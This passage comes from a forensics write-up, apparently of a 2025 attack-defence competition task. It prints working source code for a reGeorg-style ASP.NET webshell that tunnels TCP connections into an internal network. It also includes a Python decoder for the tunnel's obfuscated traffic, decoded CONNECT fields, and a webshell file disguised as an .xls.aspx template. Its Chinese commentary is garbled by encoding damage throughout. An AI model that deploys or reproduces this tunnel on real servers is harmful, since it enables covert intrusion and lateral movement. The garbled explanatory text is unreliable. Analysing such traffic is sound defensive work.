&#123;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        return buf.ToArray();</span><br><span class="line">    &#125;</span><br><span class="line">    public static byte[] randBytes(Random r, int min, int max) &#123;</span><br><span class="line">        int len = r.Next(min, max);</span><br><span class="line">        byte[] randbytes = new byte[len];</span><br><span class="line">        r.NextBytes(randbytes);</span><br><span class="line">        return randbytes;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static int bytesToInt(byte[] bytes) &#123;</span><br><span class="line">        int i;</span><br><span class="line">        i =   (  bytes[3] &amp; 0xff )</span><br><span class="line">            | (( bytes[2] &amp; 0xff ) &lt;&lt; 8 )</span><br><span class="line">            | (( bytes[1] &amp; 0xff ) &lt;&lt; 16)</span><br><span class="line">            | (( bytes[0] &amp; 0xff ) &lt;&lt; 24);</span><br><span class="line">        return i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public static byte[] intToBytes(int value) &#123;</span><br><span class="line">        byte[] src = new byte[4];</span><br><span class="line">        src[3] = (byte) (value &amp; 0xFF);</span><br><span class="line">        src[2] = (byte) ((value &gt;&gt; 8) &amp; 0xFF);</span><br><span class="line">        src[1] = (byte) ((value &gt;&gt; 16) &amp; 0xFF);</span><br><span class="line">        src[0] = (byte) ((value &gt;&gt; 24) &amp; 0xFF);</span><br><span class="line">        return src;</span><br><span class="line">    &#125;</span><br><span class="line">    public static String padding(String input)&#123;</span><br><span class="line">        int a = input.Length % 4;</span><br><span class="line">        if (a != 0)</span><br><span class="line">        &#123;</span><br><span class="line">            StringBuilder inputBuilder = new StringBuilder(input);</span><br><span class="line">            for (int i = 0; i &lt; 4 - a; i++)</span><br><span class="line">            &#123;</span><br><span class="line">                inputBuilder.Append(&quot;=&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">            input = inputBuilder.ToString();</span><br><span class="line">        &#125;</span><br><span class="line">        return input;</span><br><span class="line">    &#125;</span><br><span class="line">    public static byte[] FromBase64String(string b64Str) &#123;</span><br><span class="line">        b64Str = b64Str.Substring(1).Replace(&quot;,&quot;, &quot;+&quot;).Replace(&quot;.&quot;, &quot;/&quot;).Replace(&quot;&#125;&quot;, &quot;=&quot;);</span><br><span class="line">        b64Str = padding(b64Str);</span><br><span class="line">        b64Str = StrTr(b64Str, de, en);</span><br><span class="line">        return Convert.FromBase64String(b64Str);</span><br><span class="line">    &#125;</span><br><span class="line">    public static string ToBase64String(byte[] data) &#123;</span><br><span class="line">        string b64Str = Convert.ToBase64String(data);</span><br><span class="line">        b64Str = StrTr(b64Str, en, de);</span><br><span class="line">        b64Str = b64Str.TrimEnd(new char[1]&#123;&#x27;=&#x27;&#125;);</span><br><span class="line">        b64Str = GenerateRandomNumber(1) + b64Str.Replace(&quot;+&quot;, &quot;,&quot;).Replace(&quot;/&quot;, &quot;.&quot;).Replace(&quot;=&quot;, &quot;&#125;&quot;);</span><br><span class="line">        return b64Str;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    public static string GenerateRandomNumber(int Length)</span><br><span class="line">    &#123;</span><br><span class="line">        System.Text.StringBuilder newRandom = new System.Text.StringBuilder(62);</span><br><span class="line">        Random rd = new Random();</span><br><span class="line">        for (int i = 0; i &lt; Length; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            newRandom.Append(constant[rd.Next(62)]);</span><br><span class="line">        &#125;</span><br><span class="line">        return newRandom.ToString();</span><br><span class="line">    &#125;</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    int DATA          = 1;</span><br><span class="line">    int CMD           = 2;</span><br><span class="line">    int MARK          = 3;</span><br><span class="line">    int STATUS        = 4;</span><br><span class="line">    int ERROR         = 5;</span><br><span class="line">    int IP            = 6;</span><br><span class="line">    int PORT          = 7;</span><br><span class="line">    int REDIRECTURL   = 8;</span><br><span class="line">    int FORCEREDIRECT = 9;</span><br><span class="line">    </span><br><span class="line">    String GeorgHello = &quot;eMnKqMfb3cv,EvxK8EIqzyUc1QntO9CEMvqOiuRcbDCsJEC5CBUtu6i2e6.s8mRb.4ZMiwZ5KcI,S6ZEi6fqSMnKqMo&quot;;</span><br><span class="line"></span><br><span class="line">    Object[] info  = new Object[40];</span><br><span class="line">    Object[] rinfo = new Object[40];</span><br><span class="line">    if (Request.ContentLength != -1 &amp;&amp; Request.ContentLength != 0) &#123;</span><br><span class="line">        byte[] buff = new byte[Request.ContentLength];</span><br><span class="line">        Request.InputStream.Read(buff, 0, buff.Length);</span><br><span class="line">        string b64 = Encoding.Default.GetString(buff);</span><br><span class="line">        byte[] data = FromBase64String(b64);</span><br><span class="line">        info = blv_decode(data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    String rUrl = (String) info[REDIRECTURL];        </span><br><span class="line">    if (rUrl != null)&#123;</span><br><span class="line">        Uri u = new Uri(rUrl);</span><br><span class="line">        WebRequest request = WebRequest.Create(u);</span><br><span class="line">        request.Method = Request.HttpMethod;</span><br><span class="line">        foreach (string key in Request.Headers)</span><br><span class="line">        &#123;</span><br><span class="line">            try&#123;</span><br><span class="line">                request.Headers.Add(key, Request.Headers.Get(key));</span><br><span class="line">            &#125; catch (Exception e)&#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">        try&#123;</span><br><span class="line">            Stream body = request.GetRequestStream();</span><br><span class="line">            info[REDIRECTURL] = null;</span><br><span class="line">            byte[] data = Encoding.Default.GetBytes(ToBase64String(blv_encode(info)));</span><br><span class="line">            body.Write(data, 0, data.Length);</span><br><span class="line">            body.Close();</span><br><span class="line">        &#125; catch (Exception e)&#123;&#125;</span><br><span class="line"></span><br><span class="line">        HttpWebResponse response = (HttpWebResponse)request.GetResponse();</span><br><span class="line">        WebHeaderCollection webHeader = response.Headers;</span><br><span class="line">        for (int i=0;i &lt; webHeader.Count; i++)</span><br><span class="line">        &#123;</span><br><span class="line">            string rkey = webHeader.GetKey(i);</span><br><span class="line">            if (rkey != &quot;Content-Length&quot; &amp;&amp; rkey != &quot;Transfer-Encoding&quot;)</span><br><span class="line">                Response.AddHeader(rkey, webHeader[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        StreamReader repBody = new StreamReader(response.GetResponseStream(), Encoding.GetEncoding(&quot;UTF-8&quot;));</span><br><span class="line">        string rbody = repBody.ReadToEnd();</span><br><span class="line">        Response.AddHeader(&quot;Content-Length&quot;, rbody.Length.ToString());</span><br><span class="line">        Response.Write(rbody);</span><br><span class="line">        return;</span><br><span class="line">    &#125;</span><br><span class="line">    Response.StatusCode = 200;</span><br><span class="line">    String cmd = (String) info[CMD];</span><br><span class="line">    if (cmd != null) &#123;</span><br><span class="line">        String mark = (String) info[MARK];</span><br><span class="line">        if (cmd == &quot;CONNECT&quot;) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                String target = (String) info[IP];</span><br><span class="line">                int port = int.Parse((String) info[PORT]);</span><br><span class="line">                IPAddress ip;</span><br><span class="line">                try &#123;</span><br><span class="line">                    ip = IPAddress.Parse(target);</span><br><span class="line">                &#125; catch (Exception ex) &#123;</span><br><span class="line">                    IPHostEntry host = Dns.GetHostByName(target);</span><br><span class="line">                    ip = host.AddressList[0];</span><br><span class="line">                &#125;</span><br><span class="line">                System.Net.IPEndPoint remoteEP = new IPEndPoint(ip, port);</span><br><span class="line">                Socket sender = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);</span><br><span class="line"></span><br><span class="line">                // set the connect timeout to 2 seconds, default 20 seconds</span><br><span class="line">                IAsyncResult result = sender.BeginConnect(remoteEP,null,null);</span><br><span class="line">                bool success = result.AsyncWaitHandle.WaitOne( 2000, true );</span><br><span class="line"></span><br><span class="line">                if ( sender.Connected ) &#123;</span><br><span class="line">                    sender.Blocking = false;</span><br><span class="line">                    Application.Add(mark, sender);</span><br><span class="line">                    rinfo[STATUS] = &quot;OK&quot;;</span><br><span class="line">                &#125; else &#123;</span><br><span class="line">                    sender.Close();</span><br><span class="line">                    rinfo[STATUS] = &quot;FAIL&quot;;</span><br><span class="line">                    if ( success ) &#123;</span><br><span class="line">                        rinfo[ERROR] = &quot;Port close&quot;;</span><br><span class="line">                    &#125; else &#123;</span><br><span class="line">                        rinfo[ERROR] = &quot;Port filtered&quot;;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (Exception ex) &#123;</span><br><span class="line">                rinfo[STATUS] = &quot;FAIL&quot;;</span><br><span class="line">                rinfo[ERROR] = ex.Message;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else if (cmd == &quot;DISCONNECT&quot;) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Socket s = (Socket)Application[mark];</span><br><span class="line">                s.Close();</span><br><span class="line">            &#125; catch (Exception ex)&#123;</span><br><span class="line">            &#125;</span><br><span class="line">            Application.Remove(mark);</span><br><span class="line">        &#125; else if (cmd == &quot;FORWARD&quot;) &#123;</span><br><span class="line">            Socket s = (Socket)Application[mark];</span><br><span class="line">            try &#123;</span><br><span class="line">                s.Send((byte[]) info[DATA]);</span><br><span class="line">                rinfo[STATUS] = &quot;OK&quot;;</span><br><span class="line">            &#125; catch (Exception ex) &#123;</span><br><span class="line">                rinfo[STATUS] = &quot;FAIL&quot;;</span><br><span class="line">                rinfo[ERROR] = ex.Message;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; else if (cmd == &quot;READ&quot;) &#123;</span><br><span class="line">            try &#123;</span><br><span class="line">                Socket s = (Socket)Application[mark];</span><br><span class="line">                int maxRead = 524288;</span><br><span class="line">                int readbuflen = 513;</span><br><span class="line">                int readLen = 0;</span><br><span class="line">                byte[] readBuff = new byte[readbuflen];</span><br><span class="line">                MemoryStream readData = new MemoryStream();</span><br><span class="line">                try &#123;</span><br><span class="line">                    int c = s.Receive(readBuff);</span><br><span class="line">                    while (c &gt; 0) &#123;</span><br><span class="line">                        byte[] newBuff = new byte[c];</span><br><span class="line">                        System.Buffer.BlockCopy(readBuff, 0, newBuff, 0, c);</span><br><span class="line">                        string b64 = ToBase64String(newBuff);</span><br><span class="line">                        readData.Write(newBuff, 0, c);</span><br><span class="line">                        readLen += c;</span><br><span class="line">                        if (c &lt; readbuflen || readLen &gt;= maxRead)</span><br><span class="line">                            break;</span><br><span class="line">                        c = s.Receive(readBuff);</span><br><span class="line">                    &#125;</span><br><span class="line">                    rinfo[DATA] = readData.ToArray();</span><br><span class="line">                    rinfo[STATUS] = &quot;OK&quot;;</span><br><span class="line">                &#125; catch (SocketException ex) &#123;</span><br><span class="line">                    rinfo[STATUS] = &quot;OK&quot;;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; catch (Exception ex) &#123;</span><br><span class="line">                rinfo[STATUS] = &quot;FAIL&quot;;</span><br><span class="line">                rinfo[ERROR] = ex.Message;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        Response.Write(ToBase64String(blv_encode(rinfo)));</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        Response.Write(Encoding.Default.GetString(FromBase64String(GeorgHello)));</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æµé‡åªæœ‰ä¸€æ¡ï¼Œæˆ‘ä»¬æ¥çœ‹ä¸‹å…¶ä¸­åšäº†ä»€ä¹ˆ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">å‘é€ï¼šPooP14Atcdv3WDZuWyfM9sIVuBfET4uOrDu9rcRti1f2W4fuYsgb86W98uREEvUVtQU9DdqANBZ9n1uLimNONwNmemOdIEC2r1q,MsW5Dvg,imIqScfLbwxLwcCLtKu,H4.s8vOZM4.Ki4g5mKxK8DV2rd1tYKLE5mNsAdum8sqMSDvcAmqZLcgcTcuZZwOZ7mWqesibfcvMT1uZbciMDsL5kwC9uBucX9OMxvqc.olP16a,.DNey91c1o8P160ON6weXsUVO41e3uIKWd8dXuU08mDozmDKSHxAVcnStc84XuU0CcxO8mn4Xufnr9DLNwqmNsR,SKi,kdR,Q6vegQqFVD19U4qP3duE54W5msZoiwV9i61,36qcZug,m4.L9KucnwVsgvZsDQNetuCMj1Lo8v1V5KVL14WbImvtD9CZS41VywVA8sRsydRcxDZ5xB1cb9.L8cRLysNu7ExbbmRVOs1mi6fLuwVbw6ZoVvLcn9fuTyuMeQDmeuxKVB.cwQvk8wIeJ1usZsZcucVKiEV4S1RPQ4qbRcfurdDE7Qq,mvvtymusDDNVn9L9MwOeq1fMb9Csfmiuw9UER</span><br><span class="line"></span><br><span class="line">è¿”å›ï¼š</span><br><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Cache-Control: private</span><br><span class="line">Content-Type: text/html; charset=utf-8</span><br><span class="line">Server: Microsoft-IIS/8.5</span><br><span class="line">X-Powered-By: ASP.NET</span><br><span class="line">Date: Tue, 01 Jul 2025 02:19:40 GMT</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 393</span><br><span class="line"></span><br><span class="line">vooP14US1yJGbFJVo05Jlw.Zy5Od9Ij7ct4EllCotki0tQ9gpJOm7Jyp3W.8jfXeWHY.YDZbaUJX,3UpF3Hbfk.SaDeAOeMjzZZsdA8ingYxfpZXX9R4R4qPTOjxuXG4V,bWPFmVJ6NqO0.4oMjQLMVgZcmbqBUCgZPt.23UxUcEGACittUi6viNhrqqjMqtd5oP16auXwr4Xuf5377AXnn09H6ALIGoCWfbbeUUloiRWdzGYI13QJ9a2Fd0JeydonmN81OFaCeDYmpn9Qvgyb1xBndTpMn0xsSnwGyblXyT9dczD4Hm,smcD07v6rOyeIR3f.c,B9ByBDsCXJnhJTjGfooThybvu3EgOErvhwhSFIhMFUwFcmtjiPnHEvkTbYfv3NF47</span><br></pre></td></tr></table></figure><p>ä¹ä¸€çœ‹ä¸æ˜¯base64  å…¶å®å°±æ˜¯base64 <img src="/images/2025%E7%94%B5%E4%BF%A1%E9%9B%86%E5%9B%A2%E6%94%BB%E9%98%B2%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20251204175432544.png" alt="image-20251204175432544"></p><p>åœ¨ä»£ç†ä¸­çš„ä»£ç å°†+ / = æ›¿æ¢äº†ã€‚ç„¶å base64 æ¢è¡¨<img src="/images/2025%E7%94%B5%E4%BF%A1%E9%9B%86%E5%9B%A2%E6%94%BB%E9%98%B2%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20251204175603397.png" alt="image-20251204175603397"></p><p><img src="/images/2025%E7%94%B5%E4%BF%A1%E9%9B%86%E5%9B%A2%E6%94%BB%E9%98%B2%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20251204175849777.png" alt="image-20251204175849777"></p><p>è¿™æ ·å°±è§£å‡ºæ¥æµé‡äº†ï¼Œç«‹ä½“ä¸€ç‚¹,è„šæœ¬<img src="/images/2025%E7%94%B5%E4%BF%A1%E9%9B%86%E5%9B%A2%E6%94%BB%E9%98%B2%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20251204180050234.png" alt="image-20251204180050234"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ ‡å‡† Base64 è¡¨</span></span><br><span class="line">en = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># è‡ªå®šä¹‰ Base64 è¡¨ï¼ˆä½ çš„ de è¡¨ï¼‰</span></span><br><span class="line">de = <span class="string">&quot;o5n/OZUfAMhHmcyXK9wD1uvgdEQ64sBGlbTxqLRC2+YJk3zj8trWNVIiSe7pFPa0&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decode_custom_base64</span>(<span class="params">s</span>):</span></span><br><span class="line">    <span class="comment"># å»æ‰é¦–å­—ç¬¦</span></span><br><span class="line">    s = s[<span class="number">1</span>:]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># å­—ç¬¦æ›¿æ¢ï¼šæ··æ·† â†’ åŸå§‹ Base64 å­—ç¬¦</span></span><br><span class="line">    s = s.replace(<span class="string">&quot;,&quot;</span>, <span class="string">&quot;+&quot;</span>).replace(<span class="string">&quot;.&quot;</span>, <span class="string">&quot;/&quot;</span>).replace(<span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;=&quot;</span>)</span><br><span class="line">   <span class="comment"># print(s)</span></span><br><span class="line">    <span class="comment"># æ›¿æ¢è¡¨è§£ç ï¼šè‡ªå®šä¹‰Base64 â†’ æ ‡å‡†Base64</span></span><br><span class="line">    normal = []</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> ch == <span class="string">&quot;=&quot;</span>:      <span class="comment"># padding</span></span><br><span class="line">            normal.append(<span class="string">&quot;=&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            idx = de.index(ch)</span><br><span class="line">            normal.append(en[idx])</span><br><span class="line"></span><br><span class="line">    normal_b64 = <span class="string">&quot;&quot;</span>.join(normal)</span><br><span class="line">    <span class="comment"># print(normal_b64)</span></span><br><span class="line">    <span class="comment"># Base64 è§£ç </span></span><br><span class="line">    <span class="keyword">return</span> base64.b64decode(normal_b64)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># ---------- è§£ç ä½ çš„ GeorgHello ----------</span></span><br><span class="line">cipher = <span class="string">&quot;PooP14Atcdv3WDZuWyfM9sIVuBfET4uOrDu9rcRti1f2W4fuYsgb86W98uREEvUVtQU9DdqANBZ9n1uLimNONwNmemOdIEC2r1q,MsW5Dvg,imIqScfLbwxLwcCLtKu,H4.s8vOZM4.Ki4g5mKxK8DV2rd1tYKLE5mNsAdum8sqMSDvcAmqZLcgcTcuZZwOZ7mWqesibfcvMT1uZbciMDsL5kwC9uBucX9OMxvqc.olP16a,.DNey91c1o8P160ON6weXsUVO41e3uIKWd8dXuU08mDozmDKSHxAVcnStc84XuU0CcxO8mn4Xufnr9DLNwqmNsR,SKi,kdR,Q6vegQqFVD19U4qP3duE54W5msZoiwV9i61,36qcZug,m4.L9KucnwVsgvZsDQNetuCMj1Lo8v1V5KVL14WbImvtD9CZS41VywVA8sRsydRcxDZ5xB1cb9.L8cRLysNu7ExbbmRVOs1mi6fLuwVbw6ZoVvLcn9fuTyuMeQDmeuxKVB.cwQvk8wIeJ1usZsZcucVKiEV4S1RPQ4qbRcfurdDE7Qq,mvvtymusDDNVn9L9MwOeq1fMb9Csfmiuw9UER&quot;</span></span><br><span class="line"><span class="comment">#cipher = &quot;vooP14US1yJGbFJVo05Jlw.Zy5Od9Ij7ct4EllCotki0tQ9gpJOm7Jyp3W.8jfXeWHY.YDZbaUJX,3UpF3Hbfk.SaDeAOeMjzZZsdA8ingYxfpZXX9R4R4qPTOjxuXG4V,bWPFmVJ6NqO0.4oMjQLMVgZcmbqBUCgZPt.23UxUcEGACittUi6viNhrqqjMqtd5oP16auXwr4Xuf5377AXnn09H6ALIGoCWfbbeUUloiRWdzGYI13QJ9a2Fd0JeydonmN81OFaCeDYmpn9Qvgyb1xBndTpMn0xsSnwGyblXyT9dczD4Hm,smcD07v6rOyeIR3f.c,B9ByBDsCXJnhJTjGfooThybvu3EgOErvhwhSFIhMFUwFcmtjiPnHEvkTbYfv3NF47&quot;</span></span><br><span class="line">raw = decode_custom_base64(cipher)</span><br><span class="line"><span class="keyword">import</span> struct</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">blv_decode</span>(<span class="params">data: <span class="built_in">bytes</span></span>):</span></span><br><span class="line">    info = [<span class="literal">None</span>] * <span class="number">40</span></span><br><span class="line"></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    data_len = <span class="built_in">len</span>(data)</span><br><span class="line"></span><br><span class="line">    ptr = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> ptr &lt; data_len:</span><br><span class="line">        b = data[ptr]</span><br><span class="line">        ptr += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># è¯»å– 4 å­—èŠ‚é•¿åº¦</span></span><br><span class="line">        l_bytes = data[ptr:ptr+<span class="number">4</span>]</span><br><span class="line">        ptr += <span class="number">4</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># å¤§ç«¯æ•´æ•°</span></span><br><span class="line">        l = struct.unpack(<span class="string">&quot;&gt;I&quot;</span>, l_bytes)[<span class="number">0</span>] - <span class="number">257191907</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># å†…å®¹</span></span><br><span class="line">        v = data[ptr:ptr+l]</span><br><span class="line">        ptr += l</span><br><span class="line"></span><br><span class="line">        i += (<span class="number">5</span> + l)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># Java: if ( b &gt; 1 &amp;&amp; b &lt;= 9 ) â†’ å½“ b=2~9 æ—¶è§£ç ä¸ºå­—ç¬¦ä¸²</span></span><br><span class="line">        <span class="keyword">if</span> <span class="number">1</span> &lt; b &lt;= <span class="number">9</span>:</span><br><span class="line">            info[b] = v.decode(errors=<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            info[b] = v</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> info</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># -----------------------------------------------------</span></span><br><span class="line"><span class="comment"># è§£ç ä½ çš„æ•°æ®</span></span><br><span class="line"><span class="comment"># -----------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">info = blv_decode(raw)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> idx, value <span class="keyword">in</span> <span class="built_in">enumerate</span>(info):</span><br><span class="line">    <span class="keyword">if</span> value <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;[<span class="subst">&#123;idx&#125;</span>]  <span class="subst">&#123;value&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(&quot;è§£ç ç»“æœï¼š&quot;, plain)</span></span><br><span class="line"></span><br><span class="line">[<span class="number">0</span>]  <span class="string">b&#x27;MaksLUs8rQwmUxvbqQ2MTr6lwPz3pujuxpo4pVfYXmqhdSbB4xTBQYw3A4KC90F6fz2RJIw0SYzw3i84yaJ9R6yqAZKp7pXAIp47qpLB40OZ2aLjBVA3GHaS0vBxMcH2Ae5sb5QEHAz399wxG5bbQQa7rSvPlJtUySODBcZCC&#x27;</span></span><br><span class="line">[<span class="number">2</span>]  CONNECT</span><br><span class="line">[<span class="number">3</span>]  4m.OtmDqNmWd3c</span><br><span class="line">[<span class="number">6</span>]  <span class="number">10.148</span><span class="number">.254</span><span class="number">.17</span></span><br><span class="line">[<span class="number">7</span>]  <span class="number">6100</span></span><br><span class="line">[<span class="number">39</span>]  <span class="string">b&#x27;E9tJC4vjxCzlbjZmnWjO5MDFrOmaVAs0LtP7KTwmJmnCEUzLp9QASBKWWXWSkNqVroRP0YMACYTs8v1lSFqxqMNKR0vgNbccLPcyCaD9p6iNwEzf8a2mDuC7lyUKXRlP5ZSBDub9Ryi39V45x3Rik0KnkQWEtSU7T7gW8RoZrHf4ura6zjJLYlN1WSOMBFTIHNdPraFwG3uRDff&#x27;</span></span><br></pre></td></tr></table></figure><p><img src="/images/2025%E7%94%B5%E4%BF%A1%E9%9B%86%E5%9B%A2%E6%94%BB%E9%98%B2%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20251204180217568.png" alt="image-20251204180217568"></p><p>å°ä¼™ä¼´è¯´ï¼Œä»–ä¹Ÿä¸è®°å¾—è¿™ä¸ªé—®é¢˜é—®çš„å•¥äº†ï¼Œæœ‰å°ä¼™ä¼´çŸ¥é“çš„ï¼Œå‘Šè¯‰å¼Ÿå¼Ÿä¸€ä¸‹ã€‚è¿™é‡Œæ²¡æœ‰è§£å¯†[0] å’Œ[39]  é¢˜ç›®ä¸­åº”è¯¥ä¸æ¶‰åŠï¼Œè¿˜æœ‰å°±æ˜¯regeorgæ²¡æœ‰ç»™keyï¼Œåé¢åœ¨ä»”ç»†åˆ†æï¼Œåšé¢˜å¤Ÿç”¨äº†ã€‚</p><p>æœ€åä¸€é—®æ˜¯æœ¨é©¬çš„è·¯å¾„ï¼Œ<img src="/images/2025%E7%94%B5%E4%BF%A1%E9%9B%86%E5%9B%A2%E6%94%BB%E9%98%B2%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20251204180506187.png" alt="image-20251204180506187"></p><p>æœ€åä¸€ä¸ªåŒ…è¾“æœ¨é©¬çš„ï¼Œçœ‹ä¸‹ä¼ é€’ä¿¡æ¯ï¼Œ</p><p>c2lnbjo9TW1NczVtWXE5V01YVlVNdlJXVjVnM1ZyUkdlWGhsU0lObVZHSjBUVmxqU1hoa1ZDWmxhU1ZVVEk1a1ZVMUdkb05HTXgwMFN3UTJVT3RHYkxSbE0xQW5UNnAwTVBaRmJ4d2tlR056WXIxa01PcEdieFJtUkN4bVlIeG1XWGRFWng4RVZLTlhVcUoxU2hoa1N4bDFWS2xIWlZobVRrQmpVNXhrZWtCbFVWWlZTT3BuUXUxVVIxUWxWcTVrVmxwbVNWTjFST2hVWXJKMVNTUmxTaFJWVkdCMVVXbFVlaFZWVzVWMVU1c1dZeEkwVlJKVFV5SW1hRk5EWkd4MmJUQmpTd1VGVnNwRlpWQjNkVEJUVjFVRlZCSmpXR3BrVmtSMGF3UTFVMEZHVnJOWE1UVkVkelVHU29aVlpIaFRla2RsVlkxRVdPRmxVWEZqUU5OalF4TWxWV1pWVVhGelROVjFiOW9qYm5sMmM</p><p><img src="/images/2025%E7%94%B5%E4%BF%A1%E9%9B%86%E5%9B%A2%E6%94%BB%E9%98%B2%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20251204181024638.png" alt="image-20251204181024638"></p><p>è¿™é‡Œä½ ä¼šå‘ç° 1111.xls.aspx å’ŒTemplate.aspx çš„keyå’Œivæ˜¯ç›¸åŒçš„ï¼Œé‚£ä¹ˆè¯´æ˜åº”è¯¥æ˜¯ä¸€ä¸ªæ–‡ä»¶ï¼Œè€Œä¸”è¿™ä¸ªæ“ä½œæ˜¯copyæ–‡ä»¶<code>destFileName*D:/sovell2/api/ExcelTemplate/Template.aspxmethodNamemoveFilesessionId99eb31ed466a5e42srcFileName*D:/sovell2/api/ExcelTemplate/11 11.xls.aspx</code><img src="/images/2025%E7%94%B5%E4%BF%A1%E9%9B%86%E5%9B%A2%E6%94%BB%E9%98%B2%E5%86%B3%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20251204181310605.png" 